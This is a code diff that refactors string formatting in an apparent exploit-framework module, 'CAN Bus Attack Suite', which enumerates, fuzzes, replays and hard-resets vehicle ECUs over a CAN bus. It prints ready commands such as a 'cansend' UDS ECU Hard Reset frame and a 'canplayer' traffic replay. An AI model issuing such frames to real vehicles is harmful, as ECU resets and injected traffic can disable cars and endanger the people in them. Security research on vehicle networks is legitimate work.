@@ -124,14 +124,12 @@ class Exploit(Exploit):
 
         print_status("Construindo OBD-II broadcast (0x7DF) para enumeração...")
         obd2_req = _build_obd2_request(0x01, 0x00)  # Supported PIDs
-        print_info("Frame OBD-II PID 0x00 (enumerate): {}".format(obd2_req.hex()))
-        print_info("Frame UDS Session Default (0x7E0): {}".format(
-            _build_uds_request(0x10, _UDS_SESSION_DEFAULT).hex()))
+        print_info(f"Frame OBD-II PID 0x00 (enumerate): {obd2_req.hex()}")
+        print_info(f"Frame UDS Session Default (0x7E0): {_build_uds_request(0x10, _UDS_SESSION_DEFAULT).hex()}")
 
     def _simulate_fuzz(self):
         """Geração de frames de fuzzing CAN."""
-        print_warning("Modo fuzzing: geração de {} frames aleatórios (ID: {}-{})".format(
-            self.fuzz_count, hex(self.can_id_start), hex(self.can_id_end)))
+        print_warning(f"Modo fuzzing: geração de {self.fuzz_count} frames aleatórios (ID: {hex(self.can_id_start)}-{hex(self.can_id_end)})")
         count = int(self.fuzz_count)
         id_range = int(self.can_id_end) - int(self.can_id_start) + 1
         headers = ["#", "ID CAN (hex)", "DLC", "Data (hex)"]
@@ -143,7 +141,7 @@ class Exploit(Exploit):
             rows.append((str(i + 1), hex(rand_id), str(dlc), data.hex()))
         print_table(headers, *rows)
         if count > 10:
-            print_info("... {} frames adicionais seriam gerados".format(count - 10))
+            print_info(f"... {count - 10} frames adicionais seriam gerados")
 
     def _simulate_uds_reset(self):
         """Construção de frame UDS ECU Reset."""
@@ -153,10 +151,9 @@ class Exploit(Exploit):
         print_warning("UDS ECU Reset (SID 0x11, subFunc 0x01 = Hard Reset)")
         print_info("ECU alvo: {} ({})".format(hex(ecu_id), next(
             (d for i, d in _COMMON_ECU_IDS if i == ecu_id), "ECU desconhecida")))
-        print_info("Payload UDS: {}".format(payload.hex()))
-        print_info("Frame CAN raw: {}".format(frame.hex()))
-        print_warning("Envio via socketCAN: sudo cansend {} #{:03X}#{}".format(
-            self.interface, ecu_id, payload.hex().upper()))
+        print_info(f"Payload UDS: {payload.hex()}")
+        print_info(f"Frame CAN raw: {frame.hex()}")
+        print_warning(f"Envio via socketCAN: sudo cansend {self.interface} #{ecu_id:03X}#{payload.hex().upper()}")
 
     @mute
     def check(self):
@@ -170,12 +167,11 @@ class Exploit(Exploit):
     def run(self):
         """Executa ataque CAN conforme modo selecionado."""
         mode = str(self.mode).lower()
-        print_status("CAN Bus Attack Suite | interface={} | modo={}".format(
-            self.interface, mode))
+        print_status(f"CAN Bus Attack Suite | interface={self.interface} | modo={mode}")
 
         sock = self._open_can_socket()
         if sock:
-            print_success("Socket CAN aberto em {}".format(self.interface))
+            print_success(f"Socket CAN aberto em {self.interface}")
             sock.close()
         else:
             print_warning("Socket CAN não disponível — modo demonstração (requer root + driver CAN)")
@@ -193,12 +189,11 @@ class Exploit(Exploit):
             if not self.capture_file:
                 print_error("capture_file não definido para modo replay")
                 return
-            print_status("Replay de arquivo: {}".format(self.capture_file))
+            print_status(f"Replay de arquivo: {self.capture_file}")
             print_info("Formato esperado: candump logfile (timestamp CAN_IF ID#DATA)")
-            print_warning("Replay real: canplayer -I {} -i {}".format(
-                self.capture_file, self.interface))
+            print_warning(f"Replay real: canplayer -I {self.capture_file} -i {self.interface}")
         else:
-            print_error("Modo desconhecido: {}. Use: enum | fuzz | replay | uds_reset | obd2_scan".format(mode))
+            print_error(f"Modo desconhecido: {mode}. Use: enum | fuzz | replay | uds_reset | obd2_scan")
 
         print_info("")
         print_info("Ferramentas CAN recomendadas para uso real:")
